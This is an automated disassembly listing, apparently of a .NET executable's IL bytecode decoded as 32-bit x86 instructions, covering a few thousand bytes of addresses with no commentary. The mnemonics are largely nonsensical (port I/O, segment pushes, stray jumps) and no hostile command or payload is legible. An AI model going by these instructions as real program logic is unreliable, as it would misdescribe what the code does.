  403ffd:	04 0e                	add    $0xe,%al
  403fff:	04 05                	add    $0x5,%al
  404001:	19 17                	sbb    %edx,(%edi)
  404003:	28 02                	sub    %al,(%edx)
  404005:	00 00                	add    %al,(%eax)
  404007:	06                   	push   %es
  404008:	0a 06                	or     (%esi),%al
  40400a:	2c 3d                	sub    $0x3d,%al
  40400c:	73 c9                	jae    0x403fd7
  40400e:	00 00                	add    %al,(%eax)
  404010:	0a 0b                	or     (%ebx),%cl
  404012:	06                   	push   %es
  404013:	7b 22                	jnp    0x404037
  404015:	00 00                	add    %al,(%eax)
  404017:	04 6f                	add    $0x6f,%al
  404019:	ca 00 00             	lret   $0x0
  40401c:	0a 0d 16 13 04 2b    	or     0x2b041316,%cl
  404022:	12 09                	adc    (%ecx),%cl
  404024:	11 04 93             	adc    %eax,(%ebx,%edx,4)
  404027:	0c 07                	or     $0x7,%al
  404029:	08 6f cb             	or     %ch,-0x35(%edi)
  40402c:	00 00                	add    %al,(%eax)
  40402e:	0a 11                	or     (%ecx),%dl
  404030:	04 17                	add    $0x17,%al
  404032:	58                   	pop    %eax
  404033:	13 04 11             	adc    (%ecx,%edx,1),%eax
  404036:	04 09                	add    $0x9,%al
  404038:	8e 69 32             	mov    0x32(%ecx),%gs
  40403b:	e7 06                	out    %eax,$0x6
  40403d:	7b 21                	jnp    0x404060
  40403f:	00 00                	add    %al,(%eax)
  404041:	04 07                	add    $0x7,%al
  404043:	73 cc                	jae    0x404011
  404045:	00 00                	add    %al,(%eax)
  404047:	0a 2a                	or     (%edx),%ch
  404049:	14 2a                	adc    $0x2a,%al
  40404b:	1e                   	push   %ds
  40404c:	02 7b 41             	add    0x41(%ebx),%bh
  40404f:	00 00                	add    %al,(%eax)
  404051:	04 2a                	add    $0x2a,%al
  404053:	00 13                	add    %dl,(%ebx)
  404055:	30 03                	xor    %al,(%ebx)
  404057:	00 24 00             	add    %ah,(%eax,%eax,1)
  40405a:	00 00                	add    %al,(%eax)
  40405c:	0f 00 00             	sldt   (%eax)
  40405f:	11 72 01             	adc    %esi,0x1(%edx)
  404062:	00 00                	add    %al,(%eax)
  404064:	70 0a                	jo     0x404070
  404066:	02 7b 4c             	add    0x4c(%ebx),%bh
  404069:	00 00                	add    %al,(%eax)
  40406b:	04 02                	add    $0x2,%al
  40406d:	7b 4d                	jnp    0x4040bc
  40406f:	00 00                	add    %al,(%eax)
  404071:	04 12                	add    $0x12,%al
  404073:	00 28                	add    %ch,(%eax)
  404075:	21 00                	and    %eax,(%eax)
  404077:	00 06                	add    %al,(%esi)
  404079:	17                   	pop    %ss
  40407a:	33 02                	xor    (%edx),%eax
  40407c:	06                   	push   %es
  40407d:	2a 72 01             	sub    0x1(%edx),%dh
  404080:	00 00                	add    %al,(%eax)
  404082:	70 2a                	jo     0x4040ae
  404084:	13 30                	adc    (%eax),%esi
  404086:	03 00                	add    (%eax),%eax
  404088:	70 00                	jo     0x40408a
  40408a:	00 00                	add    %al,(%eax)
  40408c:	10 00                	adc    %al,(%eax)
  40408e:	00 11                	add    %dl,(%ecx)
  404090:	73 c9                	jae    0x40405b
  404092:	00 00                	add    %al,(%eax)
  404094:	0a 0a                	or     (%edx),%cl
  404096:	17                   	pop    %ss
  404097:	28 cd                	sub    %cl,%ch
  404099:	00 00                	add    %al,(%eax)
  40409b:	0a 0b                	or     (%ebx),%cl
  40409d:	12 01                	adc    (%ecx),%al
  40409f:	28 ce                	sub    %cl,%dh
  4040a1:	00 00                	add    %al,(%eax)
  4040a3:	0a 1f                	or     (%edi),%bl
  4040a5:	0d 33 07 28 cf       	or     $0xcf280733,%eax
  4040aa:	00 00                	add    %al,(%eax)
  4040ac:	0a 2b                	or     (%ebx),%ch
  4040ae:	4f                   	dec    %edi
  4040af:	12 01                	adc    (%ecx),%al
  4040b1:	28 ce                	sub    %cl,%dh
  4040b3:	00 00                	add    %al,(%eax)
  4040b5:	0a 1e                	or     (%esi),%bl
  4040b7:	33 23                	xor    (%ebx),%esp
  4040b9:	06                   	push   %es
  4040ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4040bb:	d0 00                	rolb   $1,(%eax)
  4040bd:	00 0a                	add    %cl,(%edx)
  4040bf:	16                   	push   %ss
  4040c0:	31 d4                	xor    %edx,%esp
  4040c2:	06                   	push   %es
  4040c3:	06                   	push   %es
  4040c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4040c5:	d0 00                	rolb   $1,(%eax)
  4040c7:	00 0a                	add    %cl,(%edx)
  4040c9:	17                   	pop    %ss
  4040ca:	59                   	pop    %ecx
  4040cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4040cc:	d1 00                	roll   $1,(%eax)
  4040ce:	00 0a                	add    %cl,(%edx)
  4040d0:	72 49                	jb     0x40411b
  4040d2:	02 00                	add    (%eax),%al
  4040d4:	70 28                	jo     0x4040fe
  4040d6:	d2 00                	rolb   %cl,(%eax)
  4040d8:	00 0a                	add    %cl,(%edx)
  4040da:	2b ba 12 01 28 d3    	sub    -0x2cd7feee(%edx),%edi
  4040e0:	00 00                	add    %al,(%eax)
  4040e2:	0a 2c b1             	or     (%ecx,%esi,4),%ch
  4040e5:	06                   	push   %es
  4040e6:	12 01                	adc    (%ecx),%al
  4040e8:	28 d3                	sub    %dl,%bl
  4040ea:	00 00                	add    %al,(%eax)
  4040ec:	0a 6f cb             	or     -0x35(%edi),%ch
  4040ef:	00 00                	add    %al,(%eax)
  4040f1:	0a 72 51             	or     0x51(%edx),%dh
  4040f4:	02 00                	add    (%eax),%al
  4040f6:	70 28                	jo     0x404120
  4040f8:	d2 00                	rolb   %cl,(%eax)
  4040fa:	00 0a                	add    %cl,(%edx)
  4040fc:	2b 98 06 2a 13 30    	sub    0x30132a06(%eax),%ebx
  404102:	04 00                	add    $0x0,%al
  404104:	4c                   	dec    %esp
  404105:	00 00                	add    %al,(%eax)
  404107:	00 11                	add    %dl,(%ecx)
  404109:	00 00                	add    %al,(%eax)
  40410b:	11 73 c9             	adc    %esi,-0x37(%ebx)
  40410e:	00 00                	add    %al,(%eax)
  404110:	0a 0a                	or     (%edx),%cl
  404112:	72 01                	jb     0x404115
  404114:	00 00                	add    %al,(%eax)
  404116:	70 0b                	jo     0x404123
  404118:	02 7b 4c             	add    0x4c(%ebx),%bh
  40411b:	00 00                	add    %al,(%eax)
  40411d:	04 02                	add    $0x2,%al
  40411f:	7b 4d                	jnp    0x40416e
  404121:	00 00                	add    %al,(%eax)
  404123:	04 12                	add    $0x12,%al
  404125:	01 17                	add    %edx,(%edi)
  404127:	28 20                	sub    %ah,(%eax)
  404129:	00 00                	add    %al,(%eax)
  40412b:	06                   	push   %es
  40412c:	17                   	pop    %ss
  40412d:	33 27                	xor    (%edi),%esp
  40412f:	07                   	pop    %es
  404130:	0d 16 13 04 2b       	or     $0x2b041316,%eax
  404135:	16                   	push   %ss
  404136:	09 11                	or     %edx,(%ecx)
  404138:	04 6f                	add    $0x6f,%al
  40413a:	6b 00 00             	imul   $0x0,(%eax),%eax
  40413d:	0a 0c 06             	or     (%esi,%eax,1),%cl
  404140:	08 6f cb             	or     %ch,-0x35(%edi)
  404143:	00 00                	add    %al,(%eax)
  404145:	0a 11                	or     (%ecx),%dl
  404147:	04 17                	add    $0x17,%al
  404149:	58                   	pop    %eax
  40414a:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40414d:	04 09                	add    $0x9,%al
  40414f:	6f                   	outsl  %ds:(%esi),(%dx)
  404150:	d4 00                	aam    $0x0
  404152:	00 0a                	add    %cl,(%edx)
  404154:	32 e0                	xor    %al,%ah
  404156:	06                   	push   %es
  404157:	2a 06                	sub    (%esi),%al
  404159:	2a 06                	sub    (%esi),%al
  40415b:	2a 06                	sub    (%esi),%al
  40415d:	2a 06                	sub    (%esi),%al
  40415f:	2a 06                	sub    (%esi),%al
  404161:	2a 06                	sub    (%esi),%al
  404163:	2a 06                	sub    (%esi),%al
  404165:	2a 00                	sub    (%eax),%al
  404167:	00 03                	add    %al,(%ebx)
  404169:	30 02                	xor    %al,(%edx)
  40416b:	00 58 00             	add    %bl,0x0(%eax)
  40416e:	00 00                	add    %al,(%eax)
  404170:	00 00                	add    %al,(%eax)
  404172:	00 00                	add    %al,(%eax)
  404174:	02 7b 4e             	add    0x4e(%ebx),%bh
  404177:	00 00                	add    %al,(%eax)
  404179:	04 2d                	add    $0x2d,%al
  40417b:	26 04 6f             	es add $0x6f,%al
  40417e:	93                   	xchg   %eax,%ebx
  40417f:	00 00                	add    %al,(%eax)
  404181:	0a 17                	or     (%edi),%dl
  404183:	33 01                	xor    (%ecx),%eax
  404185:	2a 02                	sub    (%edx),%al
  404187:	02 7b 4a             	add    0x4a(%ebx),%bh
  40418a:	00 00                	add    %al,(%eax)
  40418c:	04 73                	add    $0x73,%al
  40418e:	32 00                	xor    (%eax),%al
  404190:	00 06                	add    %al,(%esi)
  404192:	7d 4e                	jge    0x4041e2
  404194:	00 00                	add    %al,(%eax)
  404196:	04 02                	add    $0x2,%al
  404198:	7b 4e                	jnp    0x4041e8
  40419a:	00 00                	add    %al,(%eax)
  40419c:	04 6f                	add    $0x6f,%al
  40419e:	d5 00                	aad    $0x0
  4041a0:	00 0a                	add    %cl,(%edx)
  4041a2:	02 7b 4e             	add    0x4e(%ebx),%bh
  4041a5:	00 00                	add    %al,(%eax)
  4041a7:	04 04                	add    $0x4,%al
  4041a9:	6f                   	outsl  %ds:(%esi),(%dx)
  4041aa:	33 00                	xor    (%eax),%eax
  4041ac:	00 06                	add    %al,(%esi)
  4041ae:	04 6f                	add    $0x6f,%al
  4041b0:	93                   	xchg   %eax,%ebx
  4041b1:	00 00                	add    %al,(%eax)
  4041b3:	0a 17                	or     (%edi),%dl
  4041b5:	33 14 02             	xor    (%edx,%eax,1),%edx
  4041b8:	7b 4e                	jnp    0x404208
  4041ba:	00 00                	add    %al,(%eax)
  4041bc:	04 6f                	add    $0x6f,%al
  4041be:	30 00                	xor    %al,(%eax)
  4041c0:	00 06                	add    %al,(%esi)
  4041c2:	2d 07 02 14 7d       	sub    $0x7d140207,%eax
  4041c7:	4e                   	dec    %esi
  4041c8:	00 00                	add    %al,(%eax)
  4041ca:	04 2a                	add    $0x2a,%al
  4041cc:	06                   	push   %es
  4041cd:	2a 06                	sub    (%esi),%al
  4041cf:	2a 03                	sub    (%ebx),%al
  4041d1:	30 02                	xor    %al,(%edx)
  4041d3:	00 40 00             	add    %al,0x0(%eax)
  4041d6:	00 00                	add    %al,(%eax)
  4041d8:	00 00                	add    %al,(%eax)
  4041da:	00 00                	add    %al,(%eax)
  4041dc:	02 28                	add    (%eax),%ch
  4041de:	d6                   	salc
  4041df:	00 00                	add    %al,(%eax)
  4041e1:	0a 6f d7             	or     -0x29(%edi),%ch
  4041e4:	00 00                	add    %al,(%eax)
  4041e6:	0a 7d 51             	or     0x51(%ebp),%bh
  4041e9:	00 00                	add    %al,(%eax)
  4041eb:	04 02                	add    $0x2,%al
  4041ed:	28 d6                	sub    %dl,%dh
  4041ef:	00 00                	add    %al,(%eax)
  4041f1:	0a 6f d8             	or     -0x28(%edi),%ch
  4041f4:	00 00                	add    %al,(%eax)
  4041f6:	0a 7d 52             	or     0x52(%ebp),%bh
  4041f9:	00 00                	add    %al,(%eax)
  4041fb:	04 02                	add    $0x2,%al
  4041fd:	28 d9                	sub    %bl,%cl
  4041ff:	00 00                	add    %al,(%eax)
  404201:	0a 7d 53             	or     0x53(%ebp),%bh
  404204:	00 00                	add    %al,(%eax)
  404206:	04 02                	add    $0x2,%al
  404208:	28 da                	sub    %bl,%dl
  40420a:	00 00                	add    %al,(%eax)
  40420c:	0a 02                	or     (%edx),%al
  40420e:	03 7d 4f             	add    0x4f(%ebp),%edi
  404211:	00 00                	add    %al,(%eax)
  404213:	04 02                	add    $0x2,%al
  404215:	04 7d                	add    $0x7d,%al
  404217:	50                   	push   %eax
  404218:	00 00                	add    %al,(%eax)
  40421a:	04 2a                	add    $0x2a,%al
  40421c:	13 30                	adc    (%eax),%esi
  40421e:	03 00                	add    (%eax),%eax
  404220:	2e 00 00             	add    %al,%cs:(%eax)
  404223:	00 12                	add    %dl,(%edx)
  404225:	00 00                	add    %al,(%eax)
  404227:	11 02                	adc    %eax,(%edx)
  404229:	7b 50                	jnp    0x40427b
  40422b:	00 00                	add    %al,(%eax)
  40422d:	04 2d                	add    $0x2d,%al
  40422f:	02 14 2a             	add    (%edx,%ebp,1),%dl
  404232:	02 7b 54             	add    0x54(%ebx),%bh
  404235:	00 00                	add    %al,(%eax)
  404237:	04 25                	add    $0x25,%al
  404239:	2d 1a 26 02 02       	sub    $0x202261a,%eax
  40423e:	7b 50                	jnp    0x404290
  404240:	00 00                	add    %al,(%eax)
  404242:	04 73                	add    $0x73,%al
  404244:	5a                   	pop    %edx
  404245:	00 00                	add    %al,(%eax)
  404247:	06                   	push   %es
  404248:	28 db                	sub    %bl,%bl
  40424a:	00 00                	add    %al,(%eax)
  40424c:	0a 25 0a 7d 54 00    	or     0x547d0a,%ah
  404252:	00 04 06             	add    %al,(%esi,%eax,1)
  404255:	2a 1e                	sub    (%esi),%bl
  404257:	02 7b 51             	add    0x51(%ebx),%bh
  40425a:	00 00                	add    %al,(%eax)
  40425c:	04 2a                	add    $0x2a,%al
  40425e:	1e                   	push   %ds
  40425f:	02 7b 52             	add    0x52(%ebx),%bh
  404262:	00 00                	add    %al,(%eax)
  404264:	04 2a                	add    $0x2a,%al
  404266:	1e                   	push   %ds
  404267:	02 7b 53             	add    0x53(%ebx),%bh
  40426a:	00 00                	add    %al,(%eax)
  40426c:	04 2a                	add    $0x2a,%al
  40426e:	1a 72 55             	sbb    0x55(%edx),%dh
  404271:	02 00                	add    (%eax),%al
  404273:	70 2a                	jo     0x40429f
  404275:	1e                   	push   %ds
  404276:	02 7b 50             	add    0x50(%ebx),%bh
  404279:	00 00                	add    %al,(%eax)
  40427b:	04 2a                	add    $0x2a,%al
  40427d:	2e 16                	cs push %ss
  40427f:	1b 16                	sbb    (%esi),%edx
  404281:	1f                   	pop    %ds
  404282:	1d 73 dc 00 00       	sbb    $0xdc73,%eax
  404287:	0a 2a                	or     (%edx),%ch
  404289:	06                   	push   %es
  40428a:	2a 06                	sub    (%esi),%al
  40428c:	2a 06                	sub    (%esi),%al
  40428e:	2a 06                	sub    (%esi),%al
  404290:	2a 66 02             	sub    0x2(%esi),%ah
  404293:	7b 4f                	jnp    0x4042e4
  404295:	00 00                	add    %al,(%eax)
  404297:	04 17                	add    $0x17,%al
  404299:	6f                   	outsl  %ds:(%esi),(%dx)
  40429a:	70 00                	jo     0x40429c
  40429c:	00 06                	add    %al,(%esi)
  40429e:	02 7b 4f             	add    0x4f(%ebx),%bh
  4042a1:	00 00                	add    %al,(%eax)
  4042a3:	04 03                	add    $0x3,%al
  4042a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4042a6:	72 00                	jb     0x4042a8
  4042a8:	00 06                	add    %al,(%esi)
  4042aa:	2a 72 02             	sub    0x2(%edx),%dh
  4042ad:	28 11                	sub    %dl,(%ecx)
  4042af:	00 00                	add    %al,(%eax)
  4042b1:	0a 03                	or     (%ebx),%al
  4042b3:	2d 0b 72 75 02       	sub    $0x275720b,%eax
  4042b8:	00 70 73             	add    %dh,0x73(%eax)
  4042bb:	dd 00                	fldl   (%eax)
  4042bd:	00 0a                	add    %cl,(%edx)
  4042bf:	7a 02                	jp     0x4042c3
  4042c1:	03 7d 55             	add    0x55(%ebp),%edi
  4042c4:	00 00                	add    %al,(%eax)
  4042c6:	04 2a                	add    $0x2a,%al
  4042c8:	32 02                	xor    (%edx),%al
  4042ca:	7b 55                	jnp    0x404321
  4042cc:	00 00                	add    %al,(%eax)
  4042ce:	04 7b                	add    $0x7b,%al
  4042d0:	42                   	inc    %edx
  4042d1:	00 00                	add    %al,(%eax)
  4042d3:	04 2a                	add    $0x2a,%al
  4042d5:	36 02 7b 55          	add    %ss:0x55(%ebx),%bh
  4042d9:	00 00                	add    %al,(%eax)
  4042db:	04 03                	add    $0x3,%al
  4042dd:	7d 42                	jge    0x404321
  4042df:	00 00                	add    %al,(%eax)
  4042e1:	04 2a                	add    $0x2a,%al
  4042e3:	32 02                	xor    (%edx),%al
  4042e5:	7b 55                	jnp    0x40433c
  4042e7:	00 00                	add    %al,(%eax)
  4042e9:	04 7b                	add    $0x7b,%al
  4042eb:	43                   	inc    %ebx
  4042ec:	00 00                	add    %al,(%eax)
  4042ee:	04 2a                	add    $0x2a,%al
  4042f0:	36 02 7b 55          	add    %ss:0x55(%ebx),%bh
  4042f4:	00 00                	add    %al,(%eax)
  4042f6:	04 03                	add    $0x3,%al
  4042f8:	7d 43                	jge    0x40433d
  4042fa:	00 00                	add    %al,(%eax)
  4042fc:	04 2a                	add    $0x2a,%al
  4042fe:	32 02                	xor    (%edx),%al
  404300:	7b 55                	jnp    0x404357
  404302:	00 00                	add    %al,(%eax)
  404304:	04 7b                	add    $0x7b,%al
  404306:	44                   	inc    %esp
  404307:	00 00                	add    %al,(%eax)
  404309:	04 2a                	add    $0x2a,%al
  40430b:	36 02 7b 55          	add    %ss:0x55(%ebx),%bh
  40430f:	00 00                	add    %al,(%eax)
  404311:	04 03                	add    $0x3,%al
  404313:	7d 44                	jge    0x404359
  404315:	00 00                	add    %al,(%eax)
  404317:	04 2a                	add    $0x2a,%al
  404319:	32 02                	xor    (%edx),%al
  40431b:	7b 55                	jnp    0x404372
  40431d:	00 00                	add    %al,(%eax)
  40431f:	04 7b                	add    $0x7b,%al
  404321:	45                   	inc    %ebp
  404322:	00 00                	add    %al,(%eax)
  404324:	04 2a                	add    $0x2a,%al
  404326:	36 02 7b 55          	add    %ss:0x55(%ebx),%bh
  40432a:	00 00                	add    %al,(%eax)
  40432c:	04 03                	add    $0x3,%al
  40432e:	7d 45                	jge    0x404375
  404330:	00 00                	add    %al,(%eax)
  404332:	04 2a                	add    $0x2a,%al
  404334:	32 02                	xor    (%edx),%al
  404336:	7b 55                	jnp    0x40438d
  404338:	00 00                	add    %al,(%eax)
  40433a:	04 7b                	add    $0x7b,%al
  40433c:	46                   	inc    %esi
  40433d:	00 00                	add    %al,(%eax)
  40433f:	04 2a                	add    $0x2a,%al
  404341:	36 02 7b 55          	add    %ss:0x55(%ebx),%bh
  404345:	00 00                	add    %al,(%eax)
  404347:	04 03                	add    $0x3,%al
  404349:	7d 46                	jge    0x404391
  40434b:	00 00                	add    %al,(%eax)
  40434d:	04 2a                	add    $0x2a,%al
  40434f:	32 02                	xor    (%edx),%al
  404351:	7b 55                	jnp    0x4043a8
  404353:	00 00                	add    %al,(%eax)
  404355:	04 7b                	add    $0x7b,%al
  404357:	47                   	inc    %edi
  404358:	00 00                	add    %al,(%eax)
  40435a:	04 2a                	add    $0x2a,%al
  40435c:	36 02 7b 55          	add    %ss:0x55(%ebx),%bh
  404360:	00 00                	add    %al,(%eax)
  404362:	04 03                	add    $0x3,%al
  404364:	7d 47                	jge    0x4043ad
  404366:	00 00                	add    %al,(%eax)
  404368:	04 2a                	add    $0x2a,%al
  40436a:	32 02                	xor    (%edx),%al
  40436c:	7b 55                	jnp    0x4043c3
  40436e:	00 00                	add    %al,(%eax)
  404370:	04 7b                	add    $0x7b,%al
  404372:	48                   	dec    %eax
  404373:	00 00                	add    %al,(%eax)
  404375:	04 2a                	add    $0x2a,%al
  404377:	36 02 7b 55          	add    %ss:0x55(%ebx),%bh
  40437b:	00 00                	add    %al,(%eax)
  40437d:	04 03                	add    $0x3,%al
  40437f:	7d 48                	jge    0x4043c9
  404381:	00 00                	add    %al,(%eax)
  404383:	04 2a                	add    $0x2a,%al
  404385:	32 02                	xor    (%edx),%al
  404387:	7b 55                	jnp    0x4043de
  404389:	00 00                	add    %al,(%eax)
  40438b:	04 7b                	add    $0x7b,%al
  40438d:	49                   	dec    %ecx
  40438e:	00 00                	add    %al,(%eax)
  404390:	04 2a                	add    $0x2a,%al
  404392:	36 02 7b 55          	add    %ss:0x55(%ebx),%bh
  404396:	00 00                	add    %al,(%eax)
  404398:	04 03                	add    $0x3,%al
  40439a:	7d 49                	jge    0x4043e5
  40439c:	00 00                	add    %al,(%eax)
  40439e:	04 2a                	add    $0x2a,%al
  4043a0:	32 02                	xor    (%edx),%al
  4043a2:	7b 55                	jnp    0x4043f9
  4043a4:	00 00                	add    %al,(%eax)
  4043a6:	04 7b                	add    $0x7b,%al
  4043a8:	4a                   	dec    %edx
  4043a9:	00 00                	add    %al,(%eax)
  4043ab:	04 2a                	add    $0x2a,%al
  4043ad:	36 02 7b 55          	add    %ss:0x55(%ebx),%bh
  4043b1:	00 00                	add    %al,(%eax)
  4043b3:	04 03                	add    $0x3,%al
  4043b5:	7d 4a                	jge    0x404401
  4043b7:	00 00                	add    %al,(%eax)
  4043b9:	04 2a                	add    $0x2a,%al
  4043bb:	32 02                	xor    (%edx),%al
  4043bd:	7b 55                	jnp    0x404414
  4043bf:	00 00                	add    %al,(%eax)
  4043c1:	04 7b                	add    $0x7b,%al
  4043c3:	4b                   	dec    %ebx
  4043c4:	00 00                	add    %al,(%eax)
  4043c6:	04 2a                	add    $0x2a,%al
  4043c8:	36 02 7b 55          	add    %ss:0x55(%ebx),%bh
  4043cc:	00 00                	add    %al,(%eax)
  4043ce:	04 03                	add    $0x3,%al
  4043d0:	7d 4b                	jge    0x40441d
  4043d2:	00 00                	add    %al,(%eax)
  4043d4:	04 2a                	add    $0x2a,%al
  4043d6:	1e                   	push   %ds
  4043d7:	02 7b 56             	add    0x56(%ebx),%bh
  4043da:	00 00                	add    %al,(%eax)
  4043dc:	04 2a                	add    $0x2a,%al
  4043de:	22 02                	and    (%edx),%al
  4043e0:	03 7d 56             	add    0x56(%ebp),%edi
  4043e3:	00 00                	add    %al,(%eax)
  4043e5:	04 2a                	add    $0x2a,%al
  4043e7:	1e                   	push   %ds
  4043e8:	02 7b 57             	add    0x57(%ebx),%bh
  4043eb:	00 00                	add    %al,(%eax)
  4043ed:	04 2a                	add    $0x2a,%al
  4043ef:	22 02                	and    (%edx),%al
  4043f1:	03 7d 57             	add    0x57(%ebp),%edi
  4043f4:	00 00                	add    %al,(%eax)
  4043f6:	04 2a                	add    $0x2a,%al
  4043f8:	1e                   	push   %ds
  4043f9:	02 28                	add    (%eax),%ch
  4043fb:	11 00                	adc    %eax,(%eax)
  4043fd:	00 0a                	add    %cl,(%edx)
  4043ff:	2a 9e 02 7b 58 00    	sub    0x587b02(%esi),%bl
  404405:	00 04 03             	add    %al,(%ebx,%eax,1)
  404408:	74 08                	je     0x404412
  40440a:	00 00                	add    %al,(%eax)
  40440c:	1b 04 6f             	sbb    (%edi,%ebp,2),%eax
  40440f:	df 00                	filds  (%eax)
  404411:	00 0a                	add    %cl,(%edx)
  404413:	6f                   	outsl  %ds:(%esi),(%dx)
  404414:	e0 00                	loopne 0x404416
  404416:	00 0a                	add    %cl,(%edx)
  404418:	6f                   	outsl  %ds:(%esi),(%dx)
  404419:	e1 00                	loope  0x40441b
  40441b:	00 0a                	add    %cl,(%edx)
  40441d:	6f                   	outsl  %ds:(%esi),(%dx)
  40441e:	e2 00                	loop   0x404420
  404420:	00 0a                	add    %cl,(%edx)
  404422:	6f                   	outsl  %ds:(%esi),(%dx)
  404423:	e3 00                	jecxz  0x404425
  404425:	00 0a                	add    %cl,(%edx)
  404427:	2a 8a 02 7b 58 00    	sub    0x587b02(%edx),%cl
  40442d:	00 04 03             	add    %al,(%ebx,%eax,1)
  404430:	74 09                	je     0x40443b
  404432:	00 00                	add    %al,(%eax)
  404434:	1b 04 6f             	sbb    (%edi,%ebp,2),%eax
  404437:	df 00                	filds  (%eax)
  404439:	00 0a                	add    %cl,(%edx)
  40443b:	6f                   	outsl  %ds:(%esi),(%dx)
  40443c:	e4 00                	in     $0x0,%al
  40443e:	00 0a                	add    %cl,(%edx)
  404440:	6f                   	outsl  %ds:(%esi),(%dx)
  404441:	10 00                	adc    %al,(%eax)
  404443:	00 0a                	add    %cl,(%edx)
  404445:	6f                   	outsl  %ds:(%esi),(%dx)
  404446:	c4 00                	les    (%eax),%eax
  404448:	00 0a                	add    %cl,(%edx)
  40444a:	2a 56 03             	sub    0x3(%esi),%dl
  40444d:	6f                   	outsl  %ds:(%esi),(%dx)
  40444e:	e5 00                	in     $0x0,%eax
  404450:	00 0a                	add    %cl,(%edx)
  404452:	2c 0c                	sub    $0xc,%al
  404454:	02 7b 59             	add    0x59(%ebx),%bh
  404457:	00 00                	add    %al,(%eax)
  404459:	04 6f                	add    $0x6f,%al
  40445b:	e6 00                	out    %al,$0x0
  40445d:	00 0a                	add    %cl,(%edx)
  40445f:	26 2a 00             	sub    %es:(%eax),%al
  404462:	00 00                	add    %al,(%eax)
  404464:	1b 30                	sbb    (%eax),%esi
  404466:	06                   	push   %es
  404467:	00 fe                	add    %bh,%dh
  404469:	04 00                	add    $0x0,%al
  40446b:	00 13                	add    %dl,(%ebx)
  40446d:	00 00                	add    %al,(%eax)
  40446f:	11 14 13             	adc    %edx,(%ebx,%edx,1)
  404472:	16                   	push   %ss
  404473:	14 13                	adc    $0x13,%al
  404475:	17                   	pop    %ss
  404476:	14 13                	adc    $0x13,%al
  404478:	18 73 7a             	sbb    %dh,0x7a(%ebx)
  40447b:	00 00                	add    %al,(%eax)
  40447d:	06                   	push   %es
  40447e:	13 19                	adc    (%ecx),%ebx
  404480:	28 e7                	sub    %ah,%bh
  404482:	00 00                	add    %al,(%eax)
  404484:	0a 73 79             	or     0x79(%ebx),%dh
  404487:	00 00                	add    %al,(%eax)
  404489:	06                   	push   %es
  40448a:	0a 16                	or     (%esi),%dl
  40448c:	0b 7e 14             	or     0x14(%esi),%edi
  40448f:	00 00                	add    %al,(%eax)
  404491:	0a 0c 11             	or     (%ecx,%edx,1),%cl
  404494:	19 73 3a             	sbb    %esi,0x3a(%ebx)
  404497:	00 00                	add    %al,(%eax)
  404499:	06                   	push   %es
  40449a:	7d 58                	jge    0x4044f4
  40449c:	00 00                	add    %al,(%eax)
  40449e:	04 06                	add    $0x6,%al
  4044a0:	11 19                	adc    %ebx,(%ecx)
  4044a2:	7b 58                	jnp    0x4044fc
  4044a4:	00 00                	add    %al,(%eax)
  4044a6:	04 73                	add    $0x73,%al
  4044a8:	4d                   	dec    %ebp
  4044a9:	00 00                	add    %al,(%eax)
  4044ab:	06                   	push   %es
  4044ac:	0d 11 19 16 73       	or     $0x73161911,%eax
  4044b1:	e8 00 00 0a 7d       	call   0x7d4a44b6
  4044b6:	59                   	pop    %ecx
  4044b7:	00 00                	add    %al,(%eax)
  4044b9:	04 28                	add    $0x28,%al
  4044bb:	27                   	daa
  4044bc:	00 00                	add    %al,(%eax)
  4044be:	0a 14 fe             	or     (%esi,%edi,8),%dl
  4044c1:	06                   	push   %es
  4044c2:	78 00                	js     0x4044c4
  4044c4:	00 06                	add    %al,(%esi)
  4044c6:	73 e9                	jae    0x4044b1
  4044c8:	00 00                	add    %al,(%eax)
  4044ca:	0a 6f ea             	or     -0x16(%edi),%ch
  4044cd:	00 00                	add    %al,(%eax)
  4044cf:	0a 09                	or     (%ecx),%cl
  4044d1:	28 eb                	sub    %ch,%bl
  4044d3:	00 00                	add    %al,(%eax)
  4044d5:	0a 13                	or     (%ebx),%dl
  4044d7:	04 11                	add    $0x11,%al
  4044d9:	04 16                	add    $0x16,%al
  4044db:	6f                   	outsl  %ds:(%esi),(%dx)
  4044dc:	ec                   	in     (%dx),%al
  4044dd:	00 00                	add    %al,(%eax)
  4044df:	0a 11                	or     (%ecx),%dl
  4044e1:	04 6f                	add    $0x6f,%al
  4044e3:	ed                   	in     (%dx),%eax
  4044e4:	00 00                	add    %al,(%eax)
  4044e6:	0a 28                	or     (%eax),%ch
  4044e8:	ee                   	out    %al,(%dx)
  4044e9:	00 00                	add    %al,(%eax)
  4044eb:	0a 13                	or     (%ebx),%dl
  4044ed:	05 11 05 11 04       	add    $0x4110511,%eax
  4044f2:	6f                   	outsl  %ds:(%esi),(%dx)
  4044f3:	ef                   	out    %eax,(%dx)
  4044f4:	00 00                	add    %al,(%eax)
  4044f6:	0a 11                	or     (%ecx),%dl
  4044f8:	05 6f f0 00 00       	add    $0xf06f,%eax
  4044fd:	0a 6f f1             	or     -0xf(%edi),%ch
  404500:	00 00                	add    %al,(%eax)
  404502:	0a 11                	or     (%ecx),%dl
  404504:	16                   	push   %ss
  404505:	2d 0f 11 19 fe       	sub    $0xfe19110f,%eax
  40450a:	06                   	push   %es
  40450b:	7b 00                	jnp    0x40450d
  40450d:	00 06                	add    %al,(%esi)
  40450f:	73 f2                	jae    0x404503
  404511:	00 00                	add    %al,(%eax)
  404513:	0a 13                	or     (%ebx),%dl
  404515:	16                   	push   %ss
  404516:	11 16                	adc    %edx,(%esi)
  404518:	6f                   	outsl  %ds:(%esi),(%dx)
  404519:	f3 00 00             	repz add %al,(%eax)
  40451c:	0a 73 f4             	or     -0xc(%ebx),%dh
  40451f:	00 00                	add    %al,(%eax)
  404521:	0a 13                	or     (%ebx),%dl
  404523:	06                   	push   %es
  404524:	28 36                	sub    %dh,(%esi)
  404526:	00 00                	add    %al,(%eax)
  404528:	06                   	push   %es
  404529:	2c 1c                	sub    $0x1c,%al
  40452b:	72 01                	jb     0x40452e
  40452d:	00 00                	add    %al,(%eax)
  40452f:	70 13                	jo     0x404544
  404531:	07                   	pop    %es
  404532:	2b 09                	sub    (%ecx),%ecx
  404534:	11 06                	adc    %eax,(%esi)
  404536:	11 07                	adc    %eax,(%edi)
  404538:	6f                   	outsl  %ds:(%esi),(%dx)
  404539:	f5                   	cmc
  40453a:	00 00                	add    %al,(%eax)
  40453c:	0a 28                	or     (%eax),%ch
